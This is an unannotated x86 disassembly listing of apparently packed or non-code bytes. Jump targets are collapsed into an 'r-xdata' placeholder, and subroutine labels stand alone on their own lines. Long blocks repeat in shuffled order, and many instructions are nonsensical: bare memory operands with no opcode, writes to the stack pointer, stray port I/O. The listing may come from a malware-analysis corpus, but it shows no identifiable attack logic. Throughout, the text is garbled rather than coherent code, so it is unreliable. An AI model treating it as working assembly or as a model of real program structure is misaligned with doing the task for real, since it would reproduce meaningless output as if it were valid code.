jpo r-xdata
jmp r-xdata
jmp sub_47a94c
and eax 0xebebb8b2
jmp r-xdata
sub eax 0x2ffef62d
add [ esp + eax * 4 + 0x2c842d2b ] 0x2b
jmp r-xdata
jmp r-xdata
jmp r-xdata
jns r-xdata
test [ esi ] bh
jpe r-xdata
jpo r-xdata
mov ebx 0xa68cff74
cmp eax 0x3e
xchg [ ebx - 0x6e ] edx
scasd [ edi ]
movsb [ edi ] [ esi ]
test [ ebx + ebp * 8 - 0x6d74f17c ] al
sub al 0xb7
test [ esp + eax * 4 + 0x7b7bc3ed ] al
test [ esi ] cl
xchg ebx eax
add [ ds : esp + ebp - 0x5c3b6dd1 ] 0xffffff84
je r-xdata
dec [ ebx - 0x6d8484a0 ]
mov esp [ eax + 0x7b ]
jpo r-xdata
jmp r-xdata
jae r-xdata
movsd [ edi ] [ esi ]
xchg esi eax
test [ esp - 0x1447dfdb ] al
jmp r-xdata
mov eax [ esp + eax * 4 + 0x742ebeb ]
r-xdata
mov esp [ ecx - 0x14147b7c ]
jmp r-xdata
jns r-xdata
imul edi [ 0x1692a9fe ] 0x70
jpo r-xdata
daa
arpl [ ebx + 0x7b ] di
jmp r-xdata
pop edi
pop edi
pop ebx
xchg edx eax
xor [ ebx - 0x14147b7c ] eax
jmp r-xdata
cmp ecx [ ebx - 0x14147b7c ]
inc edx
pop es
jpo r-xdata
jmp r-xdata
imul edi eax 0xffffffb9
jg r-xdata
test [ eax + esi * 8 - 0x794a0d1 ] al
mov ecx 0x5ffff67f
jmp r-xdata
[ edi - 0x15 ]
jpo r-xdata
scasb [ edi ]
lea eax [ esp + eax * 4 - 0x14141415 ]
sbb eax 0x23ab3ef2
adc [ esi ] ebx
xchg edx eax
retn
jmp r-xdata
jge r-xdata
jpo r-xdata
jmp r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
and al 0x25
test [ ebx + ebp + 0x2b2c842d ] al
mov bh 0x77
jpo r-xdata
mov dl 0xb8
jmp r-xdata
jmp r-xdata
jmp r-xdata
dec eax
test eax 0xe8cbaf0
jmp r-xdata
jmp r-xdata
test bl ch
add [ esp + ebp - 0x5c3b6dd1 ] 0xffffff84
sub al 0x67
sub [ edx + 0x7b7b6084 ] dl
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
sub_47a957
test [ edx + edx * 4 + 0x7b7b6491 ] al
jmp r-xdata
mov dl 0xb8
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jns r-xdata
test [ esi ] bh
jpe r-xdata
jpo r-xdata
mov ebx 0xa68cff74
cmp eax 0x3e
xchg [ ebx - 0x6e ] edx
scasd [ edi ]
movsb [ edi ] [ esi ]
test [ ebx + ebp * 8 - 0x6d74f17c ] al
sub al 0xb7
test [ esp + eax * 4 + 0x7b7bc3ed ] al
test [ esi ] cl
xchg ebx eax
add [ ds : esp + ebp - 0x5c3b6dd1 ] 0xffffff84
je r-xdata
dec [ ebx - 0x6d8484a0 ]
mov esp [ eax + 0x7b ]
jpo r-xdata
jmp r-xdata
jae r-xdata
movsd [ edi ] [ esi ]
xchg esi eax
test [ esp - 0x1447dfdb ] al
jmp r-xdata
mov eax [ esp + eax * 4 + 0x742ebeb ]
r-xdata
mov esp [ ecx - 0x14147b7c ]
jmp r-xdata
jns r-xdata
imul edi [ 0x1692a9fe ] 0x70
jpo r-xdata
daa
arpl [ ebx + 0x7b ] di
jmp r-xdata
jmp r-xdata
pop edi
pop edi
pop ebx
xchg edx eax
xor [ ebx - 0x14147b7c ] eax
jmp r-xdata
cmp ecx [ ebx - 0x14147b7c ]
inc edx
pop es
jpo r-xdata
jmp r-xdata
and eax 0xebebb8b2
jmp r-xdata
imul edi eax 0xffffffb9
jg r-xdata
test [ eax + esi * 8 - 0x794a0d1 ] al
mov ecx 0x5ffff67f
jmp r-xdata
[ edi - 0x15 ]
jpo r-xdata
scasb [ edi ]
lea eax [ esp + eax * 4 - 0x14141415 ]
sbb eax 0x23ab3ef2
adc [ esi ] ebx
xchg edx eax
retn
jmp r-xdata
jge r-xdata
sub eax 0x2ffef62d
add [ esp + eax * 4 + 0x2c842d2b ] 0x2b
jpo r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
and al 0x25
test [ ebx + ebp + 0x2b2c842d ] al
mov bh 0x77
jpo r-xdata
jmp r-xdata
jmp r-xdata
dec eax
test eax 0xe8cbaf0
jmp r-xdata
jmp r-xdata
test bl ch
add [ esp + ebp - 0x5c3b6dd1 ] 0xffffff84
sub al 0x67
sub [ edx + 0x7b7b6084 ] dl
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
sub_47a9a6
jmp r-xdata
mov ecx 0x5ffff67f
jmp r-xdata
je r-xdata
dec [ ebx - 0x6d8484a0 ]
mov esp [ eax + 0x7b ]
jpo r-xdata
jmp r-xdata
jae r-xdata
movsd [ edi ] [ esi ]
xchg esi eax
test [ esp - 0x1447dfdb ] al
jmp r-xdata
mov eax [ esp + eax * 4 + 0x742ebeb ]
r-xdata
mov esp [ ecx - 0x14147b7c ]
jmp r-xdata
jns r-xdata
imul edi [ 0x1692a9fe ] 0x70
jpo r-xdata
daa
arpl [ ebx + 0x7b ] di
jmp r-xdata
jmp r-xdata
pop edi
pop edi
pop ebx
xchg edx eax
xor [ ebx - 0x14147b7c ] eax
jmp r-xdata
cmp ecx [ ebx - 0x14147b7c ]
inc edx
pop es
jpo r-xdata
jmp r-xdata
and eax 0xebebb8b2
jmp r-xdata
imul edi eax 0xffffffb9
jg r-xdata
test [ eax + esi * 8 - 0x794a0d1 ] al
[ edi - 0x15 ]
jpo r-xdata
scasb [ edi ]
lea eax [ esp + eax * 4 - 0x14141415 ]
sbb eax 0x23ab3ef2
adc [ esi ] ebx
xchg edx eax
retn
jmp r-xdata
jge r-xdata
sub eax 0x2ffef62d
add [ esp + eax * 4 + 0x2c842d2b ] 0x2b
jpo r-xdata
jmp r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
jmp r-xdata
and al 0x25
test [ ebx + ebp + 0x2b2c842d ] al
mov bh 0x77
jpo r-xdata
mov dl 0xb8
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
dec eax
test eax 0xe8cbaf0
jmp r-xdata
jmp r-xdata
add [ esp + ebp - 0x5c3b6dd1 ] 0xffffff84
jmp r-xdata
sub al 0x67
sub [ edx + 0x7b7b6084 ] dl
jmp r-xdata
jns r-xdata
jmp r-xdata
test [ esi ] bh
jpe r-xdata
jmp r-xdata
jpo r-xdata
mov ebx 0xa68cff74
cmp eax 0x3e
xchg [ ebx - 0x6e ] edx
scasd [ edi ]
movsb [ edi ] [ esi ]
test [ ebx + ebp * 8 - 0x6d74f17c ] al
sub al 0xb7
test [ esp + eax * 4 + 0x7b7bc3ed ] al
test bl ch
test [ esi ] cl
xchg ebx eax
add [ ds : esp + ebp - 0x5c3b6dd1 ] 0xffffff84
xchg edx eax
sub_47a9a9
xchg esi eax
mov ah 0x84
test al dh
r-xdata
mov esp [ ecx - 0x14147b7c ]
jmp r-xdata
imul edi [ 0x1692a9fe ] 0x70
jpo r-xdata
daa
arpl [ ebx + 0x7b ] di
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
and eax 0xebebb8b2
jmp r-xdata
imul edi eax 0xffffffb9
jg r-xdata
scasb [ edi ]
lea eax [ esp + eax * 4 - 0x14141415 ]
sbb eax 0x23ab3ef2
adc [ esi ] ebx
xchg edx eax
retn
jmp r-xdata
jge r-xdata
sub eax 0x2ffef62d
add [ esp + eax * 4 + 0x2c842d2b ] 0x2b
test [ eax + esi * 8 - 0x794a0d1 ] al
mov ecx 0x5ffff67f
jmp r-xdata
[ edi - 0x15 ]
jpo r-xdata
jmp r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
jmp r-xdata
je r-xdata
dec [ ebx - 0x6d8484a0 ]
jpo r-xdata
mov dl 0xb8
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
dec eax
test eax 0xe8cbaf0
mov esp [ eax + 0x7b ]
jpo r-xdata
jmp r-xdata
and al 0x25
test [ ebx + ebp + 0x2b2c842d ] al
mov bh 0x77
jpo r-xdata
jmp r-xdata
add [ esp + ebp - 0x5c3b6dd1 ] 0xffffff84
jmp r-xdata
jae r-xdata
movsd [ edi ] [ esi ]
xchg esi eax
test [ esp - 0x1447dfdb ] al
jmp r-xdata
mov eax [ esp + eax * 4 + 0x742ebeb ]
jmp r-xdata
sub al 0x67
sub [ edx + 0x7b7b6084 ] dl
jmp r-xdata
jns r-xdata
jns r-xdata
jmp r-xdata
test [ esi ] bh
jpe r-xdata
pop edi
pop edi
pop ebx
xchg edx eax
xor [ ebx - 0x14147b7c ] eax
jmp r-xdata
cmp ecx [ ebx - 0x14147b7c ]
inc edx
pop es
jmp r-xdata
jpo r-xdata
mov ebx 0xa68cff74
cmp eax 0x3e
xchg [ ebx - 0x6e ] edx
scasd [ edi ]
movsb [ edi ] [ esi ]
test [ ebx + ebp * 8 - 0x6d74f17c ] al
sub al 0xb7
test [ esp + eax * 4 + 0x7b7bc3ed ] al
test bl ch
test [ esi ] cl
xchg ebx eax
add [ ds : esp + ebp - 0x5c3b6dd1 ] 0xffffff84
xchg edx eax
sub_47a9bd
sub al 0x74
int 0x81
xchg edx eax
arpl [ ecx - 0xde27b7c ] cx
pop ebx
xchg edx eax
pop ecx
ja r-xdata
jpo r-xdata
jpo r-xdata
adc edi [ ebx + 0x4b ]
jmp r-xdata
jmp r-xdata
jmp sub_47a9ef
jpo r-xdata
adc edi [ ebx + 0x7a ]
jpo r-xdata
mov cl 0x84
test [ edx ] ch
xchg edx eax
xchg ebx eax
outsd
adc [ edi - 0xe ] edi
call [ ebp + 0x388484b5 ]
xchg edx eax
test [ esi + esi * 8 + 0x2d2b933e ] al
div dh
test [ esi + 0xd938484 ] 0x927b7b66
js r-xdata
mov esp 0x7b7b7bff
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x3e6d44b8 ] al
test [ esp + eax * 4 - 0x28127bd8 ] eax
cli
test [ eax ] bh
jpo r-xdata
test bl ch
sbb eax 0x929106f2
jpo r-xdata
cmp eax 0x942f932f
test [ ebx + edx - 0xd385699 ] al
sub al 0xf2
cmp eax 0x943d931b
test [ ebx + edx + 0x111c2a07 ] al
sub edx [ ecx ]
jpo r-xdata
xlat
jpo r-xdata
jpo r-xdata
jpo r-xdata
lodsb [ esi ]
test [ ecx + edx + 0x4b7b137f ] al
je r-xdata
sub edx [ edx + 0x7b7b78d3 ]
test [ ebp + ebx - 0x6da4bd08 ] al
sahf
pushfd
test [ ebx + ebp * 8 - 0x44b71415 ] al
xchg edx eax
jge r-xdata
test ah ch
sti
inc esi
add [ esp + eax * 4 + 0x22ebebeb ] 0x24
jpo r-xdata
je r-xdata
in eax dx
sti
jpo r-xdata
jpo r-xdata
jpo r-xdata
dec ebx
test [ ebx + 0x7b ] bh
jpo r-xdata
cmc
jpo r-xdata
loop r-xdata
xchg edx eax
adc esp [ eax ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
and eax 0xeb7b7b77
sub al 0x84
in eax dx
xlat
jpo r-xdata
xor ch bh
cmp [ edi + 0x11 ] ch
jg r-xdata
xchg [ esp + eax * 4 + 0x7b660d93 ] al
jpo r-xdata
jpo r-xdata
jmp r-xdata
test [ 0x78d3922b ] cl
jpo r-xdata
adc edi [ ebx + 0x4b ]
fidivr [ esp + eax * 4 + 0x7a83f884 ]
je r-xdata
aas
xchg edx eax
sahf
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
sub al 0xf2
cmp eax 0x9443931f
test [ ebx + edx - 0x10cd8570 ] al
sbb edx [ ebx - 0x7b7b6bc3 ]
adc eax [ edi ]
sub bl [ ecx + edx ]
sub eax 0x7b73c792
jpo r-xdata
inc eax
movsd [ edi ] [ esi ]
je r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
je r-xdata
clc
cdq
je r-xdata
jpo r-xdata
or eax 0x78d3922b
jmp r-xdata
aas
pop edi
push ebx
adc edi [ ebx + 0x4b ]
pop edi
inc edx
cmp [ ebx + 0x74 ] ah
std
int3
test al bh
cmp [ edx + 0x74 ] 0xffffffff
jpo r-xdata
cmp esi 0xffffff84
test [ ebx + ebp * 8 + 0x3ef21deb ] al
mov [ 0xfffffffff0161123 ] eax
stosd [ edi ]
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
inc esi
jle r-xdata
sbb eax 0x925b42f8
jmp r-xdata
dec [ eax - 0x7f ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
arpl dx si
aas
dec eax
add [ esp + eax * 4 + 0x3ff2bb48 ] 0x3ff2635f
jmp r-xdata
jpo r-xdata
test [ eax ] ch
jmp r-xdata
pop esi
push 0x7b
jpo r-xdata
push 0xffffff92
mov [ 0xffffffffeb7b7b64 ] al
jmp r-xdata
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
push cs
int1
mov ebp [ edx + esi * 8 ]
cmp eax 0x96179337
imul ebp [ ebp + 0x7b ] 0x7b
clc
add al 0x67
jpe r-xdata
jpo r-xdata
movsb [ edi ] [ esi ]
mov eax [ esp + eax * 4 + 0x6f21deb ]
xchg ecx eax
xchg edx eax
int3
jpo r-xdata
je r-xdata
jl r-xdata
adc [ esi ] edx
jmp r-xdata
adc esp [ edi - 0x57 ]
test ch ch
xlat
jmp r-xdata

jns r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
cmp eax 0x96179337
jpo r-xdata
cmpsd [ esi ] [ edi ]
xchg [ esp + eax * 4 - 0x48c100e ] al
jpo r-xdata
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
sub eax [ ebp + ebp * 8 + 0x7b7b7bd7 ]
xchg ebx eax
jmp r-xdata
jpo r-xdata
xchg edx eax
shl [ ebp + 0x7b ] 0x1
jpo r-xdata
clc
or [ edx + 0x74 ] 0xfe
dec ebx
jpo r-xdata
cmp [ ebp - 0x14147b7c ] ch
jmp r-xdata
test bl ch
jmp r-xdata
xchg edx eax

xchg edx eax
inc ecx
out dx al
jpo r-xdata
jmp r-xdata
dec eax
mov ebx 0x8485c192
jmp r-xdata
clc
sub_47a9d2
xchg edi eax
and dl [ ecx ]
adc eax 0x848dae92
test bl ch
jmp r-xdata
pop ecx
ja r-xdata
jpo r-xdata
jpo r-xdata
adc edi [ ebx + 0x4b ]
jmp r-xdata
jmp r-xdata
jmp sub_47a9ef
jpo r-xdata
adc edi [ ebx + 0x7a ]
jpo r-xdata
mov cl 0x84
test [ edx ] ch
xchg edx eax
xchg ebx eax
outsd
adc [ edi - 0xe ] edi
call [ ebp + 0x388484b5 ]
xchg edx eax
test [ esi + esi * 8 + 0x2d2b933e ] al
div dh
test [ esi + 0xd938484 ] 0x927b7b66
js r-xdata
mov esp 0x7b7b7bff
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x3e6d44b8 ] al
test [ esp + eax * 4 - 0x28127bd8 ] eax
cli
test [ eax ] bh
jpo r-xdata
test bl ch
sbb eax 0x929106f2
jpo r-xdata
cmp eax 0x942f932f
test [ ebx + edx - 0xd385699 ] al
sub al 0xf2
cmp eax 0x943d931b
test [ ebx + edx + 0x111c2a07 ] al
sub edx [ ecx ]
jpo r-xdata
xlat
jpo r-xdata
jpo r-xdata
jpo r-xdata
lodsb [ esi ]
test [ ecx + edx + 0x4b7b137f ] al
je r-xdata
sub edx [ edx + 0x7b7b78d3 ]
test [ ebp + ebx - 0x6da4bd08 ] al
sahf
pushfd
test [ ebx + ebp * 8 - 0x44b71415 ] al
xchg edx eax
jge r-xdata
test ah ch
sti
inc esi
add [ esp + eax * 4 + 0x22ebebeb ] 0x24
jpo r-xdata
je r-xdata
in eax dx
sti
jpo r-xdata
jpo r-xdata
jpo r-xdata
dec ebx
test [ ebx + 0x7b ] bh
jpo r-xdata
cmc
jpo r-xdata
loop r-xdata
xchg edx eax
adc esp [ eax ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
and eax 0xeb7b7b77
sub al 0x84
in eax dx
xlat
jpo r-xdata
xor ch bh
cmp [ edi + 0x11 ] ch
jg r-xdata
xchg [ esp + eax * 4 + 0x7b660d93 ] al
jpo r-xdata
jpo r-xdata
jmp r-xdata
test [ 0x78d3922b ] cl
jpo r-xdata
adc edi [ ebx + 0x4b ]
fidivr [ esp + eax * 4 + 0x7a83f884 ]
je r-xdata
aas
xchg edx eax
sahf
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
sub al 0xf2
cmp eax 0x9443931f
test [ ebx + edx - 0x10cd8570 ] al
sbb edx [ ebx - 0x7b7b6bc3 ]
adc eax [ edi ]
sub bl [ ecx + edx ]
sub eax 0x7b73c792
jpo r-xdata
inc eax
movsd [ edi ] [ esi ]
je r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
je r-xdata
clc
cdq
je r-xdata
jpo r-xdata
or eax 0x78d3922b
jmp r-xdata
aas
pop edi
push ebx
adc edi [ ebx + 0x4b ]
pop edi
inc edx
cmp [ ebx + 0x74 ] ah
std
int3
test al bh
cmp [ edx + 0x74 ] 0xffffffff
jpo r-xdata
cmp esi 0xffffff84
test [ ebx + ebp * 8 + 0x3ef21deb ] al
mov [ 0xfffffffff0161123 ] eax
stosd [ edi ]
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
inc esi
jle r-xdata
sbb eax 0x925b42f8
jmp r-xdata
dec [ eax - 0x7f ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
arpl dx si
aas
dec eax
add [ esp + eax * 4 + 0x3ff2bb48 ] 0x3ff2635f
jmp r-xdata
jpo r-xdata
test [ eax ] ch
jmp r-xdata
pop esi
push 0x7b
jpo r-xdata
push 0xffffff92
mov [ 0xffffffffeb7b7b64 ] al
jmp r-xdata
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
push cs
int1
mov ebp [ edx + esi * 8 ]
cmp eax 0x96179337
imul ebp [ ebp + 0x7b ] 0x7b
clc
add al 0x67
jpe r-xdata
jpo r-xdata
movsb [ edi ] [ esi ]
mov eax [ esp + eax * 4 + 0x6f21deb ]
xchg ecx eax
xchg edx eax
int3
jpo r-xdata
je r-xdata
jl r-xdata
adc [ esi ] edx
jmp r-xdata
adc esp [ edi - 0x57 ]
test ch ch
xlat
jmp r-xdata

jns r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
cmp eax 0x96179337
jpo r-xdata
cmpsd [ esi ] [ edi ]
xchg [ esp + eax * 4 - 0x48c100e ] al
jpo r-xdata
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
sub eax [ ebp + ebp * 8 + 0x7b7b7bd7 ]
xchg ebx eax
jmp r-xdata
jpo r-xdata
xchg edx eax
shl [ ebp + 0x7b ] 0x1
jpo r-xdata
clc
or [ edx + 0x74 ] 0xfe
dec ebx
jpo r-xdata
cmp [ ebp - 0x14147b7c ] ch
jmp r-xdata
test bl ch
jmp r-xdata
xchg edx eax

xchg edx eax
inc ecx
out dx al
jpo r-xdata
jmp r-xdata
dec eax
mov ebx 0x8485c192
jmp r-xdata
clc
sub_47a9ef
jmp r-xdata
test bl ch
jmp r-xdata
pop ecx
ja r-xdata
jpo r-xdata
jpo r-xdata
adc edi [ ebx + 0x4b ]
jmp r-xdata
jmp r-xdata
jmp sub_47a9ef
jpo r-xdata
adc edi [ ebx + 0x7a ]
jpo r-xdata
mov cl 0x84
test [ edx ] ch
xchg edx eax
xchg ebx eax
outsd
adc [ edi - 0xe ] edi
call [ ebp + 0x388484b5 ]
xchg edx eax
test [ esi + esi * 8 + 0x2d2b933e ] al
div dh
test [ esi + 0xd938484 ] 0x927b7b66
js r-xdata
mov esp 0x7b7b7bff
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x3e6d44b8 ] al
test [ esp + eax * 4 - 0x28127bd8 ] eax
cli
test [ eax ] bh
jpo r-xdata
test bl ch
sbb eax 0x929106f2
jpo r-xdata
cmp eax 0x942f932f
test [ ebx + edx - 0xd385699 ] al
sub al 0xf2
cmp eax 0x943d931b
test [ ebx + edx + 0x111c2a07 ] al
sub edx [ ecx ]
jpo r-xdata
xlat
jpo r-xdata
jpo r-xdata
jpo r-xdata
lodsb [ esi ]
test [ ecx + edx + 0x4b7b137f ] al
je r-xdata
sub edx [ edx + 0x7b7b78d3 ]
test [ ebp + ebx - 0x6da4bd08 ] al
sahf
pushfd
test [ ebx + ebp * 8 - 0x44b71415 ] al
xchg edx eax
jge r-xdata
test ah ch
sti
inc esi
add [ esp + eax * 4 + 0x22ebebeb ] 0x24
jpo r-xdata
je r-xdata
in eax dx
sti
jpo r-xdata
jpo r-xdata
jpo r-xdata
dec ebx
test [ ebx + 0x7b ] bh
jpo r-xdata
cmc
jpo r-xdata
loop r-xdata
xchg edx eax
adc esp [ eax ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
and eax 0xeb7b7b77
sub al 0x84
in eax dx
xlat
jpo r-xdata
xor ch bh
cmp [ edi + 0x11 ] ch
jg r-xdata
xchg [ esp + eax * 4 + 0x7b660d93 ] al
jpo r-xdata
jpo r-xdata
jmp r-xdata
test [ 0x78d3922b ] cl
jpo r-xdata
adc edi [ ebx + 0x4b ]
fidivr [ esp + eax * 4 + 0x7a83f884 ]
je r-xdata
aas
xchg edx eax
sahf
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
sub al 0xf2
cmp eax 0x9443931f
test [ ebx + edx - 0x10cd8570 ] al
sbb edx [ ebx - 0x7b7b6bc3 ]
adc eax [ edi ]
sub bl [ ecx + edx ]
sub eax 0x7b73c792
jpo r-xdata
inc eax
movsd [ edi ] [ esi ]
je r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
je r-xdata
clc
cdq
je r-xdata
jpo r-xdata
or eax 0x78d3922b
jmp r-xdata
aas
pop edi
push ebx
adc edi [ ebx + 0x4b ]
pop edi
inc edx
cmp [ ebx + 0x74 ] ah
std
int3
test al bh
cmp [ edx + 0x74 ] 0xffffffff
jpo r-xdata
cmp esi 0xffffff84
test [ ebx + ebp * 8 + 0x3ef21deb ] al
mov [ 0xfffffffff0161123 ] eax
stosd [ edi ]
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
inc esi
jle r-xdata
sbb eax 0x925b42f8
jmp r-xdata
dec [ eax - 0x7f ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
arpl dx si
aas
dec eax
add [ esp + eax * 4 + 0x3ff2bb48 ] 0x3ff2635f
jmp r-xdata
jpo r-xdata
test [ eax ] ch
jmp r-xdata
pop esi
push 0x7b
jpo r-xdata
push 0xffffff92
mov [ 0xffffffffeb7b7b64 ] al
jmp r-xdata
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
push cs
int1
mov ebp [ edx + esi * 8 ]
cmp eax 0x96179337
imul ebp [ ebp + 0x7b ] 0x7b
clc
add al 0x67
jpe r-xdata
jpo r-xdata
movsb [ edi ] [ esi ]
mov eax [ esp + eax * 4 + 0x6f21deb ]
xchg ecx eax
xchg edx eax
int3
jpo r-xdata
je r-xdata
jl r-xdata
adc [ esi ] edx
jmp r-xdata
adc esp [ edi - 0x57 ]
test ch ch
xlat
jmp r-xdata

jns r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
cmp eax 0x96179337
jpo r-xdata
cmpsd [ esi ] [ edi ]
xchg [ esp + eax * 4 - 0x48c100e ] al
jpo r-xdata
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
sub eax [ ebp + ebp * 8 + 0x7b7b7bd7 ]
xchg ebx eax
jmp r-xdata
jpo r-xdata
xchg edx eax
shl [ ebp + 0x7b ] 0x1
jpo r-xdata
clc
or [ edx + 0x74 ] 0xfe
dec ebx
jpo r-xdata
cmp [ ebp - 0x14147b7c ] ch
jmp r-xdata
test bl ch
jmp r-xdata
xchg edx eax

xchg edx eax
inc ecx
out dx al
jpo r-xdata
jmp r-xdata
dec eax
mov ebx 0x8485c192
jmp r-xdata
clc
sub_47a9f6
xor [ esi - 0x6c077b7c ] eax
pop edi
cmp ecx [ ebx - 0x14147b7c ]
inc edx
pop es
test [ eax + esi * 8 - 0x794a0d1 ] al
mov ecx 0x5ffff67f
jmp r-xdata
[ edi - 0x15 ]
jpo r-xdata
jns r-xdata
je r-xdata
dec [ ebx - 0x6d8484a0 ]
jpo r-xdata
mov esp [ eax + 0x7b ]
jpo r-xdata
jmp r-xdata
test [ ebx + ebp + 0x2b2c842d ] al
mov bh 0x77
jpo r-xdata
jae r-xdata
movsd [ edi ] [ esi ]
xchg esi eax
test [ esp - 0x1447dfdb ] al
jmp r-xdata
pop edi
pop ebx
xchg edx eax
xor [ ebx - 0x14147b7c ] eax
jmp r-xdata
mov eax [ esp + eax * 4 + 0x742ebeb ]
jmp r-xdata
jmp r-xdata
r-xdata
mov esp [ ecx - 0x14147b7c ]
jmp r-xdata
jmp r-xdata
imul edi [ 0x1692a9fe ] 0x70
jpo r-xdata
daa
arpl [ ebx + 0x7b ] di
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
and eax 0xebebb8b2
jmp r-xdata
imul edi eax 0xffffffb9
jg r-xdata
jns r-xdata
scasb [ edi ]
lea eax [ esp + eax * 4 - 0x14141415 ]
sbb eax 0x23ab3ef2
adc [ esi ] ebx
xchg edx eax
retn
jmp r-xdata
jge r-xdata
and al 0x25
sub eax 0x2ffef62d
add [ esp + eax * 4 + 0x2c842d2b ] 0x2b
test [ esi ] bh
jpe r-xdata
jmp r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
jpo r-xdata
mov ebx 0xa68cff74
cmp eax 0x3e
xchg [ ebx - 0x6e ] edx
scasd [ edi ]
movsb [ edi ] [ esi ]
test [ ebx + ebp * 8 - 0x6d74f17c ] al
sub al 0xb7
test [ esp + eax * 4 + 0x7b7bc3ed ] al
test [ esi ] cl
xchg ebx eax
add [ ds : esp + ebp - 0x5c3b6dd1 ] 0xffffff84
mov dl 0xb8
jmp r-xdata
jmp r-xdata
jmp r-xdata
dec eax
test eax 0xe8cbaf0
jmp r-xdata
test bl ch
add [ esp + ebp - 0x5c3b6dd1 ] 0xffffff84
sub al 0x67
sub [ edx + 0x7b7b6084 ] dl
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
sub_47aa14
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
out dx al
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
dec eax
mov ebx 0x8485c192
jmp r-xdata
add [ esi + 0x6d938484 ] 0xffffffbc
test [ eax + esi * 8 + 0x7b7bc7fd ] al
cmc
mov ebx 0x127b7b7b
mov ebx 0x7b7b7bff
xchg edx eax
shl [ ebp + 0x7b ] 0x1
jpo r-xdata
clc
or [ edx + 0x74 ] 0xfe
dec ebx
jpo r-xdata
cmp [ ebp - 0x14147b7c ] ch
jmp r-xdata
xlat
jpo r-xdata
jpo r-xdata
clc
test bl ch
xchg edx eax

xchg edx eax
inc ecx
mov cl 0x84
test [ edx ] ch
xchg edx eax
jpo r-xdata
jpo r-xdata
dec ebx
test [ ebx + 0x7b ] bh
jpo r-xdata
test [ eax ] bh
jpo r-xdata
jmp r-xdata
test [ 0x78d3922b ] cl
jpo r-xdata
adc edi [ ebx + 0x4b ]
fidivr [ esp + eax * 4 + 0x7a83f884 ]
je r-xdata
aas
xchg edx eax
sahf
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
sbb edx [ ebx - 0x7b7b6bc3 ]
adc eax [ edi ]
sub bl [ ecx + edx ]
sub eax 0x7b73c792
jpo r-xdata
mov esp 0x7b7b7bff
jpo r-xdata
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x3e6d44b8 ] al
test [ esp + eax * 4 - 0x28127bd8 ] eax
lodsb [ esi ]
test [ ecx + edx + 0x4b7b137f ] al
jpo r-xdata
je r-xdata
test [ ebx + ebp * 8 + 0x3ef21deb ] al
mov [ 0xfffffffff0161123 ] eax
stosd [ edi ]
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
sbb eax 0x925b42f8
jmp r-xdata
pop edi
inc edx
cmp [ ebx + 0x74 ] ah
std
int3
dec [ eax - 0x7f ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
arpl dx si
aas
dec eax
add [ esp + eax * 4 + 0x3ff2bb48 ] 0x3ff2635f
jmp r-xdata
inc esi
add [ esp + eax * 4 + 0x22ebebeb ] 0x24
jpo r-xdata
test [ eax ] ch
